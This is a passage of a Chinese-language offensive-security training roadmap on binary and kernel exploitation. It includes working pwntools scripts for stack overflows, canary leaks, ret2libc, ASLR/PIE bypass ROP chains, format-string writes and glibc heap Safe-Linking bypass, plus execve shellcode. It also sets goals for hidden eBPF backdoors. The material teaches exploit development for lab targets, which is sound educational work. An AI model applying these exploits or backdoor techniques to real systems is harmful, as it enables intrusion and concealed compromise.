# 阶段 3：系统与内核漏洞利用

**作者：** Sagar Biswas ([@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT))<br/>
**权威仓库：** [The BlackHAT Roadmap](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap)<br/>
**精选生态：** [Awesome Cybersecurity Paths](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-paths) · [Penetration Testing Roadmap](https://github.com/SagarBiswas-MultiHAT/penetration-testing-roadmap) · [Awesome Cybersecurity Books](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-books)<br/>
**许可证：** [CC BY-SA 4.0](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap/blob/main/LICENSE-DOCS)<br/>
**版本：** v1.0.0 · 2027 版<br/>

<div align="right">

**大多数人止步于此。真正的操作员在这里诞生。**

</div>

**时长：** 6-12 个月 | **难度：** 高级至极限 | **每周小时：** 35-40 | **先修要求：** 完成阶段 2 | **完成率：** 剩余内容的 20%

---

## 目录

1. [本阶段适合谁](#本阶段适合谁)
2. [阶段 3 架构图](#阶段-3-架构图)
3. [时间线](#时间线)
4. [目标与检查点](#目标与检查点)
5. [里程碑项目](#里程碑项目)
6. [区块 0：环境搭建](#区块-0环境搭建)
7. [区块 1：二进制漏洞利用基础](#区块-1二进制漏洞利用基础)
8. [区块 2：Shellcode 编写](#区块-2shellcode-编写)
9. [区块 3：漏洞利用缓解与绕过](#区块-3漏洞利用缓解与绕过)
10. [区块 4：格式化字符串漏洞](#区块-4格式化字符串漏洞)
11. [区块 5：堆利用 -- Linux glibc 现代](#区块-5堆利用----linux-glibc-现代)
12. [区块 6：Windows 堆利用](#区块-6windows-堆利用)
13. [区块 7：Linux 内核利用](#区块-7linux-内核利用)
14. [区块 8：Linux 内核 SLUB/Slab 利用](#区块-8linux-内核-slubslab-利用)
15. [区块 9：Windows 内核利用](#区块-9windows-内核利用)
16. [区块 10：ARM64 利用 + PAC 绕过](#区块-10arm64-利用--pac-绕过)
17. [区块 11：控制流保护（CFG）绕过](#区块-11控制流保护cfg绕过)
18. [区块 12：Linux eBPF 后门 + 反检测](#区块-12linux-ebpf-后门--反检测)
19. [区块 13：HVCI、VBS 与 2026-2027 内核安全](#区块-13hvcivbs-与-2026-2027-内核安全)
20. [区块 14：移动安全 -- Android 与 iOS](#区块-14移动安全----android-与-ios)
21. [CTF 进阶与实验资源](#ctf-进阶与实验资源)

---

## 本阶段适合谁

你已经完成了阶段 2。你能枚举网络、横向移动、喷洒凭据、破解 WPA2。
现在你要往更底层走：应用之下、操作系统之下、内核之下。

阶段 3 教你**从第一性原理出发编写漏洞利用。** 不是使用 Metasploit。
不是粘贴 PoC 代码。而是理解指令层面正在发生什么，并亲手构建
原语。到本阶段结束时，你已跻身全球前 5%
从业者之列。

**没有捷径。没有“我跑通了漏洞利用”。没有表面知识。**

---

## 阶段 3 架构图

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_3/8._MISSED_PHASE_3 ARCHITECTURE_MAP.png" alt="PHASE 3 ARCHITECTURE MAP" width="250"/>

</td></tr></table>
</div>


## 时间线

| 区块 | 内容 | 时长 | 难度 |
|---|---|---|---|
| 0 | 环境搭建 | 3-5 天 | 中等 |
| 1 | 二进制漏洞利用基础 | 4-6 周 | 非常难 |
| 2 | Shellcode 编写 | 2-3 周 | 非常难 |
| 3 | 缓解措施与绕过（ROP） | 4-6 周 | 极限 |
| 4 | 格式化字符串 | 1-2 周 | 难 |
| 5 | 堆（Linux glibc） | 4-5 周 | 极限 |
| 6 | Windows 堆 | 3-4 周 | 极限 |
| 7 | Linux 内核 | 4-6 周 | 极限 |
| 8 | Linux 内核 SLUB | 2-3 周 | 极限 |
| 9 | Windows 内核 | 4-6 周 | 极限 |
| 10 | ARM64 + PAC 绕过 | 3-4 周 | 非常难 |
| 11 | CFG 绕过 | 1-2 周 | 极限 |
| 12 | eBPF 后门 + 反检测 | 4-6 周 | 极限 |
| 13 | HVCI / VBS | 2-3 周 | 极限 |
| 14 | 移动端（Android + iOS + CVE） | 6-8 周 | 非常难 |
| **总计** | | **6-12 个月** | |

> **关于时间的坦诚说明：** 每周 35-40 小时是声明的投入。如果你的内核构建环境出问题，仅区块 0 就能吃掉一周。要为此预留时间。区块 7-10 经常比预估耗时更长。区间之所以存在，是因为深度本身就会波动。

---

## 目标与检查点

**自第一性原理出发的底层漏洞利用。从零编写漏洞利用。理解 CPU、内存管理器、内核：在 Linux 和 Windows 上，在 x86-64 和 ARM64 上。**

到阶段 3 结束时，你对大多数加固目标都具有威胁——不是因为你运行工具，而是因为你理解工具在做什么，并且能在它们失效时重建它们。

### 到结束时你必须展示的能力

- 从零编写基于栈的缓冲区溢出漏洞利用（不用工具、不粘贴）
- 编写自定义 shellcode：x86-64 Linux 和 Windows 系统调用，不含空字节
- 绕过：栈 canary、NX/DEP、ASLR（信息泄露 + ROP）、PIE
- 手动并使用 pwntools 构建 ROP 链
- 利用格式化字符串漏洞：在全 RELRO + glibc 2.35 目标上实现泄露 + 写入
- 利用 tcache 投毒配合 Safe-Linking 绕过，利用堆 UAF/双重释放
- 在 glibc 2.34 之后的系统上使用 FSOP 或 `__exit_funcs` 作为写入目标
- 从零编写 Linux 内核提权漏洞利用（用户到 root）
- 对自定义内核模块执行 SLUB 跨缓存攻击
- 执行弹性对象（elastic objects）技术，桥接两个尺寸类
- 用 WinDbg 调试 Windows 内核，利用 HEVD 栈溢出，窃取令牌
- 从零编写 ARM64 shellcode（execve /bin/sh）
- **执行仅数据（data-only）的 ARM64 利用链，在不触发认证失败的情况下绕过 PAC**
- 绕过控制流保护（CFG）：演示可用的绕过，而不只是描述它
- 编写并加载可用的 eBPF 后门，对 ls 隐藏文件
- **加载一个还能对 `bpftool prog list` 隐藏自身的 eBPF 后门**
- 分析真实 CVE：理解根因，编写自定义 PoC，而非复制粘贴
- **完整走通一条 iOS 内核 UAF 利用链，从缺陷到 root**

---

## 里程碑项目

所有里程碑都要求一个可运行的交付物，外加一份书面的根因分析。
“它跑起来并给了我一个 shell”**不算**交付物。理解它为何有效才是交付物。

| # | 项目 | 周 | 交付物 |
|---|---|---|---|
| M1 | 栈溢出利用（无保护） | 4-6 | Python 脚本 + 根因分析文档 |
| M2 | 通过信息泄露 + ROP 绕过 Canary + ASLR | 8-12 | 可用的利用 + 带注释的 ROP 链 |
| M3 | 格式化字符串：在 glibc 2.35 上泄露 libc + 写入（无 `__malloc_hook`） | 12-14 | 使用 FSOP 或 `__exit_funcs` 的可用利用 |
| M4 | 堆 UAF + tcache 投毒配合 Safe-Linking 绕过 | 16-20 | 在 glibc 2.35 目标上可用的利用 |
| M5 | Linux 内核 LPE：真实 CVE，从零编写 | 20-28 | root shell + 详细分析 |
| M6 | Linux 内核 SLUB 跨缓存 + 弹性对象 | 28-32 | 通过跨缓存 UAF 获得 root shell + 书面技术对比 |
| M7 | Windows 内核 LPE：HEVD 栈溢出 + 令牌窃取 | 32-40 | 在 Windows 10/11 虚拟机上获得 SYSTEM shell |
| M8 | ARM64 shellcode execve(/bin/sh) + 仅数据 PAC 绕过演示 | 40-44 | 可用的 shellcode + 带注释的 PAC 绕过轨迹 |
| M9 | 真实 Windows 二进制上的 CFG 绕过 PoC | 44-48 | 可用的绕过 + 说明 |
| M10 | eBPF 后门：对 ls 隐藏文件，并对自己从 bpftool 隐藏 | 48-52 | 可用的 .bpf.o + 加载器，两项能力均已验证 |
| M11 | iOS CVE 走查：从缺陷到提权的完整链 | 52-56 | 书面分析 + 带注释的骨架利用 |

---

## 区块 0：环境搭建

> 初学者会浪费数天，只因环境有问题而失败。
> 在写第一行漏洞利用代码之前，先把环境配置正确。

### Linux 漏洞利用实验环境

```bash
# 操作系统：Ubuntu 22.04 LTS（推荐——glibc 2.35 与真实的 2027 目标匹配）
# 使用虚拟机：VirtualBox 或 VMware Workstation

# 核心工具
sudo apt update && sudo apt install -y \
    gcc g++ gdb python3 python3-pip git nasm \
    build-essential libc6-dbg patchelf \
    binutils elfutils ltrace strace \
    qemu-system-x86 qemu-system-arm qemu-system-aarch64 \
    libssl-dev libffi-dev clang \
    linux-headers-$(uname -r) \
    bpftool libbpf-dev fuse libfuse-dev

# pwntools
pip3 install pwntools

# 测试 pwntools：
python3 -c "from pwn import *; print(asm(shellcraft.amd64.linux.sh()).hex())"
# 预期：一长串十六进制的 shellcode 字节

# pwndbg（完全取代原版 GDB）
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# ROPgadget / Ropper
pip3 install ROPgadget
pip3 install ropper

# checksec
pip3 install checksec

# glibc 调试符号（堆调试必需）
sudo apt install -y libc6-dbg
```

### GDB 快速入门——常用命令

```bash
gdb ./binary           # 加载二进制文件
r                      # 运行
r arg1 arg2            # 带参数运行
r <<< $(python3 -c "print('A'*100)")  # 使用内联载荷运行

# 断点：
b main                 # 在函数名处下断点
b *0x401234            # 在精确地址处下断点
b *main+32             # 在偏移处下断点

# 单步执行：
ni                     # 下一条指令（步过调用）
si                     # 单步指令（步入调用）
c                      # 继续
finish                 # 运行到当前函数返回

# 检查：
x/20gx $rsp            # 检查 RSP 处的 20 个四字（quadword）
x/s 0x4040a0           # 按字符串检查
info registers         # 所有寄存器
info proc mappings     # 内存映射

# pwndbg 专用：
context                # 完整上下文面板
heap                   # 堆块
heap bins              # bin 内容
vis_heap_chunks        # 可视化堆布局
search -s "/bin/sh"    # 搜索全部内存
cyclic 200             # De Bruijn 模式
cyclic -l 0x6161616b   # 查找偏移
telescope $rsp         # 解引用链
```

### Windows 漏洞利用实验环境

```
环境要求：
- Windows 10 22H2 或 Windows 11 23H2 虚拟机（用户态利用）
- Windows 10 22H2 虚拟机（内核调试的目标机——独立虚拟机）
- WinDbg Preview（调试器——可放在宿主机）

Windows 虚拟机上的工具：
1. Visual Studio 2022 Community（C/C++ 工作负载）
2. WinDbg Preview：winget install Microsoft.WinDbgPreview
3. x64dbg：https://x64dbg.com/
4. PE-bear / CFF Explorer
5. Process Hacker 2
6. Python 3.11 + pip

面向 ARM64 利用：
- QEMU AArch64 系统模拟（在 Linux 宿主机上）
- pwn.college ARM64 挑战（基于云端）
```

---

## 区块 1：二进制漏洞利用基础

**时间：4-6 周 | 难度：非常难**

### 资源

| 资源 | 类型 | 时长 | 成本 | 备注 |
|---|---|---|---|---|
| [LiveOverflow 二进制漏洞利用](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeY) | YouTube | 20 小时 | 免费 | 看完每个视频。跟着写代码。不要跳过。 |
| [Smashing the Stack for Fun and Profit](http://www.phrack.org/issues/49/14.html) | 文章 | 3 小时 | 免费 | Phrack 第 49 期。开山之作。读两遍。 |
| [pwn.college](https://pwn.college) | 平台 | 40 小时 | 免费 | ASU 大学平台。结构最好的二进制课程。 |
| [Nightmare CTF 指南](https://guyinatuxedo.github.io/) | 指南 | 15 小时 | 免费 | 带讲解的 CTF 实例。极佳的补充材料。 |

### 内存布局：x86-64 Linux 进程

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_3/1._x86-64_Linux_Process.png" alt="Memory Layout: x86-64 Linux Process" width="300"/>

</td></tr></table>
</div>

**关键事实：** 栈向低地址（向下）增长。当你声明局部变量时，它们位于比保存的返回地址更低的地址。缓冲区溢出会写过局部数组的末尾，覆盖保存的 RBP，覆盖返回地址，从而让你控制 RIP。

### x86-64 调用约定（System V AMD64 ABI）

```
整数/指针参数按从左到右放入寄存器：
  第 1 个参数：RDI
  第 2 个参数：RSI
  第 3 个参数：RDX
  第 4 个参数：RCX
  第 5 个参数：R8
  第 6 个参数：R9
  第 7 个及以后：压入栈（从右到左）

返回值：RAX（64 位）或 EAX（32 位）

调用者保存：RAX、RCX、RDX、RSI、RDI、R8-R11
被调用者保存：RBX、RBP、R12-R15

关键：CALL 指令之前，栈必须 16 字节对齐。
CALL 压入返回地址后，RSP 是 8 字节对齐。
MOVAPS（SSE 指令）在未对齐的栈上会崩溃。
修复：在调用 system() 前插入一个裸 'ret' gadget 以重新对齐。
```

### 第一个漏洞利用：栈缓冲区溢出（无保护）

```c
// 文件：vuln.c
// 编译：gcc -o vuln vuln.c -fno-stack-protector -no-pie -z execstack

#include <stdio.h>
#include <string.h>

void win() {
    system("/bin/sh");
}

void vulnerable(char *input) {
    char buf[64];
    strcpy(buf, input);
    printf("You said: %s\n", buf);
}

int main(int argc, char *argv[]) {
    if (argc < 2) { puts("Usage: ./vuln <input>"); return 1; }
    vulnerable(argv[1]);
    return 0;
}
```

```bash
# 第 1 步：检查保护机制
checksec --file=./vuln
# 预期：RELRO: Partial | Stack Canary: No | NX: disabled | PIE: No

# 第 2 步：查找 win() 地址
objdump -d ./vuln | grep '<win>'
# 示例：0000000000401196 <win>:

# 第 3 步：使用 De Bruijn 模式查找偏移
gdb -q ./vuln
r $(python3 -c "from pwn import *; print(cyclic(200).decode())")
# 触发 SIGSEGV 崩溃——pwndbg 会显示 RSP 的值

python3 -c "from pwn import *; print(cyclic_find(0x6161616b))"
# 输出：72
# 含义：64 字节（buf）+ 8 字节（保存的 RBP）= 返回地址之前的 72 字节
```

```python
# 文件：exploit.py
from pwn import *

p = process('./vuln')

offset   = 72
win_addr = 0x401196     # 替换为你自己的实际值

payload  = b'A' * offset
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
```

### 栈帧可视化

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_3/2._Stack_Frame_Visualization.png" alt="Stack Frame Visualization" width="550"/>

</td></tr></table>
</div>

---

## 区块 2：Shellcode 编写

**时间：2-3 周 | 难度：非常难**

### 资源

| 资源 | 类型 | 时长 | 成本 | 备注 |
|---|---|---|---|---|
| [编写 Shellcode - YouTube](https://www.youtube.com/watch?v=ixptghqAVnk) | YouTube | 3 小时 | 免费 | 从这里开始。 |
| [Shell-storm Shellcode 数据库](http://shell-storm.org/shellcode/) | 参考 | 5 小时 | 免费 | 研究，不要复制——理解每一个。 |
| [x86-64 Linux 系统调用表](https://filippo.io/linux-syscall-table/) | 参考 | 1 小时 | 免费 | 编写汇编时保持打开。 |

### x86-64 Linux 系统调用约定

```
系统调用约定（x86-64 Linux）：
  系统调用号：RAX
  参数 1：          RDI
  参数 2：          RSI
  参数 3：          RDX
  参数 4：          R10（不是 RCX——与函数调用约定不同）
  参数 5：          R8
  参数 6：          R9
  执行：          SYSCALL 指令
  返回值：        RAX

关键系统调用号：
   0 = read(fd, buf, count)
   1 = write(fd, buf, count)
   2 = open(path, flags, mode)
  59 = execve(pathname, argv[], envp[])
  60 = exit(status)
 231 = exit_group(status)
```

### 最小 execve("/bin/sh") Shellcode——x86-64 Linux

```nasm
; 文件：shellcode.asm
; 目标：execve("/bin/sh", NULL, NULL)
; RAX=59，RDI 指向 "/bin/sh" 的指针，RSI=NULL，RDX=NULL

section .text
global _start

_start:
    xor rdx, rdx                    ; envp = NULL
    xor rsi, rsi                    ; argv = NULL
    push rdx                        ; 空终止符
    mov rax, 0x68732f2f6e69622f    ; "/bin//sh"
    push rax
    mov rdi, rsp                    ; rdi = 字符串指针
    push 59
    pop rax                         ; rax = 59，无空字节
    syscall

; 编译并测试：
; nasm -f elf64 shellcode.asm -o shellcode.o
; ld shellcode.o -o shellcode
; ./shellcode
```

```bash
# 提取原始 shellcode 字节：
objdump -d shellcode.o | grep -Po '[0-9a-f]{2} ' | tr -d ' \n'

# 或使用 pwntools：
python3 -c "
from pwn import *
context.arch = 'amd64'
context.os   = 'linux'
sc = asm(shellcraft.amd64.linux.sh())
print(f'Hex: {sc.hex()}')
print(f'Length: {len(sc)} bytes')
"

# 在测试框架中测试 shellcode：
cat > test_sc.c << 'EOF'
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>

unsigned char sc[] = "\x48\x31\xd2\x48\x31\xf6\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x6a\x3b\x58\x0f\x05";

int main() {
    void *m = mmap(NULL, sizeof(sc), PROT_READ|PROT_WRITE|PROT_EXEC,
                   MAP_ANON|MAP_PRIVATE, -1, 0);
    memcpy(m, sc, sizeof(sc));
    ((void(*)())m)();
}
EOF
gcc -o test_sc test_sc.c && ./test_sc
```

### 避免空字节

```nasm
; 问题：空字节会中断 strcpy/gets，具体取决于漏洞
; mov rax, 59 产生：48 C7 C0 3B 00 00 00（三个空字节）

; 解决方案：

; 1. 用 XOR 将寄存器清零
xor rax, rax            ; rax = 0——编码为 48 31 C0（无空字节）
xor rdx, rdx            ; rdx = 0

; 2. PUSH 小立即数 + POP
push 59                 ; 6A 3B（单字节立即数，无零填充）
pop rax                 ; 58

; 3. 在栈上构建字符串
xor rax, rax
push rax                 ; 空终止符（该指令不含空字节）
mov rax, 0x68732f2f6e69622f   ; "/bin//sh"
push rax
mov rdi, rsp

; 4. 用 test 代替与零比较的 cmp：
; 差：cmp eax, 0——83 F8 00（含空字节）
; 好：test eax, eax——85 C0（无空字节）

; 验证你的 shellcode：
python3 -c "
sc = bytes.fromhex('YOUR_HEX_HERE')
if b'\x00' in sc:
    print(f'NULL BYTE at offset {sc.index(0x00)}')
else:
    print(f'Clean: {len(sc)} bytes')
"
```

### x86-64 Windows Shellcode——PEB 遍历

```nasm
; Windows 使用的系统调用号与 Linux 不同。
; 系统调用号在不同 OS 构建之间刻意变化，以破坏漏洞利用。
; 正确做法：通过 PEB 遍历在运行时解析函数地址。

; PEB 遍历理论：
; 在 x86-64 Windows 上，PEB（进程环境块）始终位于 GS:[0x60]。
; PEB -> PEB_LDR_DATA -> InMemoryOrderModuleList：
;   条目 0：主可执行文件
;   条目 1：ntdll.dll
;   条目 2：kernel32.dll（我们要的）
; 遍历 PE 导出表以查找 GetProcAddress、LoadLibraryA。
; 在运行时解析任意 API。

; 伪代码中的模式：
; GS:[0x60]                 -> PEB
; PEB + 0x18                -> PEB_LDR_DATA*
; PEB_LDR_DATA + 0x20       -> InMemoryOrderModuleList.Flink
; Flink->Flink->Flink        -> kernel32 条目
; Entry + 0x20               -> kernel32.dll 的 DllBase
; 遍历 PE 导出目录           -> GetProcAddress
```

```python
# 使用 pwntools 的 Windows shellcraft：
from pwn import *
context.arch = 'amd64'
context.os   = 'windows'

sc = asm(shellcraft.windows.x86_64.WinExec('cmd.exe'))
print(f'Length: {len(sc)} bytes')
print(f'Hex: {sc.hex()}')
```

```bash
# 用于 Windows 载荷的 msfvenom——研究输出，逐条指令追踪：
msfvenom -p windows/x64/exec CMD=calc.exe -f c -b '\x00'
```

---

## 区块 3：漏洞利用缓解与绕过

**时间：4-6 周 | 难度：极限**

### 资源

| 资源 | 类型 | 时长 | 成本 | 备注 |
|---|---|---|---|---|
| [ROP Emporium](https://ropemporium.com/) | 平台 | 20 小时 | 免费 | 完成全部 8 个挑战。专为 ROP 设计。 |
| [绕过 ASLR - YouTube](https://www.youtube.com/watch?v=7Tq7UHZXMHY) | YouTube | 2 小时 | 免费 | 从信息泄露到基址计算 |
| [Ropper](https://github.com/sashs/Ropper) | 工具 | 1 小时 | 免费 | `ropper -f binary --search "pop rdi"` |
| [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) | 工具 | 1 小时 | 免费 | `ROPgadget --binary binary --rop` |

### 缓解措施绕过概览

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_3/3._Mitigation_Bypass_Overview.png" alt="Mitigation Bypass Overview" width="550"/>

</td></tr></table>
</div>


### 栈 Canary 绕过——格式化字符串泄露

```python
# 文件：bypass_canary.py
from pwn import *

# 什么是 Canary：
# GCC 在局部变量与保存的 RBP 之间插入一个随机 8 字节值。
# 返回时：编译器将 canary 与主副本比较——不匹配则 abort()
# 关键：Canary 总以空字节结尾（最低字节 = 0x00）。
# 格式化字符串漏洞能绕过它，因为 %p 直接读取栈。

# 第 1 步：查找 canary 位置
for i in range(1, 30):
    p = process('./vuln_with_canary_and_fmtstr')
    p.sendafter(b'> ', f'%{i}$p\n'.encode())
    line = p.recvline().strip()
    print(f'Arg {i:2d}: {line.decode()}')
    p.close()
# 查找形如 0x1a2b3c4d5e6f7800 的那个（以 00 结尾 = canary）

CANARY_OFFSET = 11  # 替换为你自己的实际值

p = process('./vuln_with_canary_and_fmtstr')
p.sendafter(b'> ', f'%{CANARY_OFFSET}$p\n'.encode())
canary = int(p.recvline().strip(), 16)
log.success(f'Canary: {hex(canary)}')

# 第 2 步：构建保留 canary 的溢出
payload  = b'A' * 64
payload += p64(canary)
payload += p64(0x0)
payload += p64(0x401196)   # win()

p.sendafter(b'> ', payload)
p.interactive()
```

### NX 绕过——ret2libc

```python
# 文件：bypass_nx.py
from pwn import *

elf  = ELF('./vuln_nx')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p    = process('./vuln_nx')

binsh_offset = next(libc.search(b'/bin/sh'))

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]    # 对齐 gadget

libc.address = 0x7ffff7000000    # 替换为实际的 libc 基址

system_addr = libc.symbols['system']
binsh_addr  = libc.address + binsh_offset

offset = 72

payload  = b'A' * offset
payload += p64(ret)          # 将栈对齐到 16 字节
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

### ASLR + PIE 绕过——信息泄露两阶段 ROP

```python
# 文件：bypass_aslr_pie.py
# 第 1 阶段：溢出 -> 泄露 GOT 地址 -> 计算 libc 基址
# 第 2 阶段：返回 main -> 再次溢出 -> 调用 system

from pwn import *

elf  = ELF('./vuln_aslr')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p    = process('./vuln_aslr')

rop = ROP(elf)
pop_rdi   = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadg  = rop.find_gadget(['ret'])[0]
puts_plt  = elf.plt['puts']
puts_got  = elf.got['puts']
main_addr = elf.symbols['main']

offset = 72

# 第 1 阶段：调用 puts(GOT[puts]) 泄露真实的 puts 地址
payload1  = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)
payload1 += p64(ret_gadg)
payload1 += p64(puts_plt)
payload1 += p64(main_addr)

p.sendlineafter(b'> ', payload1)

leaked = p.recvline().strip().ljust(8, b'\x00')
real_puts = u64(leaked)
log.success(f'Leaked puts @ {hex(real_puts)}')

libc.address = real_puts - libc.symbols['puts']
log.success(f'libc base @ {hex(libc.address)}')

system_addr = libc.symbols['system']
binsh_addr  = next(libc.search(b'/bin/sh\x00'))

# 第 2 阶段：使用真实地址执行 system("/bin/sh")
payload2  = b'A' * offset
payload2 += p64(ret_gadg)
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)

p.sendlineafter(b'> ', payload2)
p.interactive()
```

### 构建 ROP 链

```bash
# 查找 gadget：
ropper -f ./binary --search "pop rdi; ret"
ropper -f ./binary --search "pop rsi; pop r15; ret"
ROPgadget --binary ./binary --rop

# 最常用的 gadget：
# pop rdi; ret         设置 RDI（第 1 个参数）
# pop rsi; ret         设置 RSI（第 2 个参数）——常见形式：pop rsi; pop r15; ret
# pop rdx; ret         设置 RDX（第 3 个参数）——在非 libc 二进制中非常罕见
# ret                  栈对齐 gadget
# syscall              用于直接系统调用的 ROP 链
```

```python
from pwn import *
elf  = ELF('./binary')
libc = ELF('./libc.so.6')
rop  = ROP([elf, libc])
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
print(rop.dump())
payload = flat({72: rop.chain()})
```

---

## 区块 4：格式化字符串漏洞

**时间：1-2 周 | MITRE：T1203**

### 缺陷原理

```c
printf(user_input);           // VULNERABLE: user controls the format string
printf("%s", user_input);     // SAFE: format string is fixed

// %p / %x：从栈读取一个值 -> 信息泄露
// %n：将（目前已打印的字节数）写入一个地址 -> 任意写入
```

### 第 1 步——通过 %p 进行栈泄露

```python
from pwn import *
p = process('./vuln_fmtstr')

for i in range(1, 30):
    p = process('./vuln_fmtstr')
    p.sendlineafter(b'Input: ', f'%{i}$p'.encode())
    val = p.recvline().strip()
    print(f'Arg {i:2d}: {val.decode()}')
    p.close()

# 查找：
#   0x7fff...       栈地址（突破 PIE/ASLR）
#   0x7f...         libc 地址  （突破 ASLR）
#   0x???...???00   canary        （总是以 00 结尾）
#   0x401...        二进制 .text  （突破 PIE）
```

### 第 2 步——通过 %n 进行任意写入

```python
from pwn import *
p   = process('./vuln_fmtstr')
elf = ELF('./vuln_fmtstr')

# Partial RELRO 示例：用 win() 覆盖 GOT[exit]：
target_addr = elf.got['exit']
new_value   = elf.symbols['win']

offset = 8
payload = fmtstr_payload(offset, {target_addr: new_value})
p.sendlineafter(b'Input: ', payload)
p.interactive()
```

### 第 3 步——glibc 2.34 之后：无 `__malloc_hook` / `__free_hook` 的写入目标

**对 2027 至关重要：** glibc 2.34（Ubuntu 21.10+）移除了 `__malloc_hook`、`__free_hook`、`__realloc_hook`。Ubuntu 22.04 附带 glibc 2.35。Ubuntu 24.04 附带 glibc 2.39。所有现代目标都没有这些钩子。你在网上找到的大多数教程在任何现代机器上都会静默失败。

**glibc 2.34+ 上可用的写入目标：**

1. `__exit_funcs`（atexit 处理程序列表）——最简单
2. FILE 结构（FSOP——File Stream Oriented Programming）——强大
3. 栈返回地址（需要栈泄露）——始终有效
4. TLS 存储（`__pointer_chk_guard`）——突破指针混淆

```python
# 文件：exit_funcs_exploit.py——完整的 __exit_funcs 覆盖
# 当你在 glibc 2.34-2.39 上拥有任意写入 + libc 泄露时可用

from pwn import *

p    = process('./heap_or_fmtstr_vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

libc.address = 0x7f0000000000   # 替换为实际值

exit_funcs = libc.symbols['__exit_funcs']
one_gadget = libc.address + 0xebc81   # 用以下命令查找：one_gadget libc.so.6

# 使用 flavor=0（ef_free——无指针混淆）伪造 exit_function 条目：
fake = p64(0)           # next = NULL
fake += p64(1)          # idx = 1
fake += p64(0)          # flavor = 0（ef_free：直接调用，无需 demangle）
fake += p64(one_gadget) # fn.free = one_gadget
fake += p64(0)          # arg（ef_free 时忽略）

# 使用你的写入原语将该结构体写入 __exit_funcs
# 当 exit() 被调用时 -> 我们的 one_gadget 运行 -> shell
```

```python
# FSOP 路径——glibc 2.35：研究 House of Apple
# 参考：https://github.com/shellphish/how2heap
# git clone https://github.com/shellphish/how2heap
# cd how2heap && ls glibc_2.35/
# 研究 house_of_apple2.c 和 house_of_cat.c
```

---

## 区块 5：堆利用 -- Linux glibc 现代

**时间：4-5 周 | 难度：极限**

### 资源

| 资源 | 类型 | 时长 | 成本 | 备注 |
|---|---|---|---|---|
| [pwn.college 堆利用](https://pwn.college/system-security/heap-exploitation/) | 平台 | 15 小时 | 免费 | 结构最好的堆课程。完成每个模块。 |
| [how2heap](https://github.com/shellphish/how2heap) | 仓库 | 10 小时 | 免费 | 每种堆技术的可用示例。首要参考。 |
| [glibc malloc 内部结构](https://sourceware.org/glibc/wiki/MallocInternals) | 文档 | 5 小时 | 免费 | 在 how2heap 之前阅读。 |
| [HeapLAB 文章（CrowdStrike）](https://www.crowdstrike.com/blog/heap-exploitation-course-series/) | 文章 | 8 小时 | 免费 | 优秀的技术深入分析。 |

### glibc 分配器内部结构

```c
// 每个 malloc 分配的区域都存储为一个 "chunk"
// 使用中的 chunk 布局：
// prev_size（8 字节）  前一个 chunk 的大小（仅当前一个空闲时有效）
// size+flags（8 字节）  大小 | A（NON_MAIN_ARENA）| M（MMAPPED）| P（PREV_INUSE）
// 用户数据  ...        <- malloc() 在此返回指针

// BIN：
// tcache：   每线程缓存 | 单向链表 | 每个大小类最多 7 个 chunk
//            大小：24-1032 字节 | 64 个 bin | 检查极少 -> 首要目标
// fastbins：  单向链表 | chunk <= 160 字节
// unsorted：  在 chunk 被分拣到 small/large 之前的着陆区
// small bins：双向链表 | chunk < 512 字节 | 完整性检查
// large bins：带跳表的双向链表 | chunk >= 512 字节
```

### 技术 1——Tcache 投毒（glibc < 2.32）

```c
char *a = malloc(0x20);
char *b = malloc(0x20);
free(a);   // tcache[0x20]：a -> NULL
free(b);   // tcache[0x20]：b -> a -> NULL

// 对已释放的 b 进行 UAF 写入：
*(char**)b = target_addr;
// tcache[0x20]：b -> target_addr

char *p1 = malloc(0x20);    // 返回 b
char *p2 = malloc(0x20);    // 返回 target_addr！任意分配
strcpy(p2, shellcode_or_ptr);
```

### 技术 2——Safe-Linking 绕过（glibc 2.32+：2027 年必修）

**至关重要：** glibc 2.32 引入了 Safe-Linking。Ubuntu 22.04 = glibc 2.35。Ubuntu 24.04 = glibc 2.39。全部使用 Safe-Linking。如果你跳过这一节，你的 tcache 投毒会在每个现代系统上静默失败。

```c
// 2.32 之前：chunk->fd = next_free_chunk（原始指针）
// 2.32 之后：chunk->fd = next_free_chunk XOR (chunk_address >> 12)
//
// Key = (address_of_fd_field) >> 12
// 绕过：UAF 读取一个在其 tcache bin 中位于最后的已释放 chunk
//         （fd == NULL），因此存储的 fd = NULL XOR key = key。
//         读取它就能直接得到 key。
```

```python
# 文件：safelink_bypass.py
from pwn import *

p   = process('./modern_heap_vuln')
elf = ELF('./modern_heap_vuln')

def alloc(size, data): ...
def free_chunk(idx): ...
def read_chunk(idx): ...
def write_chunk(idx, data): ...

# 第 1 步：预热 tcache——释放一个 chunk（位于 bin 最后）
alloc(0x28, b'AAAA')   # chunk A（索引 0）
free_chunk(0)          # A 的 fd = 0 XOR key = key（位于 bin 最后）

# 第 2 步：UAF 读取以泄露 Safe-Linking key
leaked_fd_bytes = read_chunk(0)
key = u64(leaked_fd_bytes.ljust(8, b'\x00'))
log.success(f'Safe-Linking key: {hex(key)}')

heap_base_approx = key << 12
